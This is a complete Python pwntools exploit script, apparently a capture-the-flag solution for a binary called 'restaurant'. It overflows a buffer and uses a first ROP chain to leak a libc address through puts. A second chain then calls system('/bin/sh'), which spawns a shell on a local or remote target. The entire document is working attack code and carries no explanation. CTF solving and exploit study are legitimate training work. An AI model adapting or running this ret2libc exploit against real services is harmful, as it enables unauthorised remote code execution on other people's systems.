#!/usr/bin/env python3

from pwn import *
from sys import argv

prog = ELF("./restaurant_patched")
libc = ELF("./libc.so.6")
offset = 40

context.binary = prog

def conn(ip=None, port=None):
    if ip and port:
        r = remote(ip, port)
    else:
        r = process(prog.path)
    return r


def main():
    IP, PORT = None, None
    if len(argv) == 2:
        IP, PORT = argv[1].split(':')
    else:
        print("Local writup... (add IP:PORT for remote)")
    targ = conn(IP, PORT)

    info('ROP to get libc Addr:')
    rop = ROP(prog)
    rop.puts(prog.got['exit'])
    rop.main()
    print(rop.dump())

    targ.sendlineafter(b'> ', b'1')
    targ.sendlineafter(b'> ', b'\x90' * offset + rop.chain())

    exit_addr = unpack(targ.readline_startswith('Enjoy')[-6:].ljust(8, b'\x00'))
    libc_base = exit_addr - libc.sym['exit']
    libc_system = libc_base + libc.sym['system']
    libc_bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))

    warn(f'libc_base = {hex(libc_base)}')
    warn(f'libc_system = {hex(libc_system)}')
    warn(f'libc_bin_sh = {hex(libc_bin_sh)}')

    rop = ROP(prog)
    rop.call(rop.ret)
    rop.call(libc_system, [libc_bin_sh])
    rop.exit(42)

    info('ROP to run a shell')
    print(rop.dump())
    targ.sendlineafter(b'> ', b'1')
    targ.sendlineafter(b'> ', b'\x90' * offset + rop.chain())
    targ.interactive()

if __name__ == "__main__":
    main()
